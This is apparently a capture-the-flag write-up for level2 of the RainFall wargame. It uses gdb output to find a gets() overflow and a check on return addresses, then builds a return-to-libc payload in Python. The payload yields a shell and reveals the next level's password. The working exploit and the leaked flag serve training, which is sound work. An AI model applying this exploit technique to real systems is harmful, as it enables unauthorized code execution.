(gdb) disassemble main

0x08048545 <+6>:	call   0x80484d4 <p>

(gdb) disassemble p

0x080484ed <+25>:	call   0x80483c0 <gets@plt> //gets is knows for filling buffer without checking the size.

0x08048500 <+44>:	cmp    eax,0xb0000000 //the program is protected. you can’t change the return address to some address starting with 0xb

0x0804853e <+106>:	ret

// i will use return to libc

(gdb) p system
$3 = {<text variable, no debug info>} 0xb7e6b060 <system>

(gdb) info proc map

0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so

(gdb) find 0xb7e2c000,0xb7fd2000,("/bin/sh")
0xb7f8cc58
1 pattern found.

//the buffer offset is 80

import struct
eip = struct.pack("I", 0x0804853e)
sysAddr = struct.pack("I", 0xb7e6b060)
exit = struct.pack("I", 0xb7e5ebe0)
sh = struct.pack("I", 0xb7f8cc58)
print ("\x90"*80)+eip+sysAddr+exit+sh

level2@RainFall:~$ cat pl -| ./level2
����������������������������������������������������������������>������������>`�����X��
whoami
level3
cd ..
cd level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

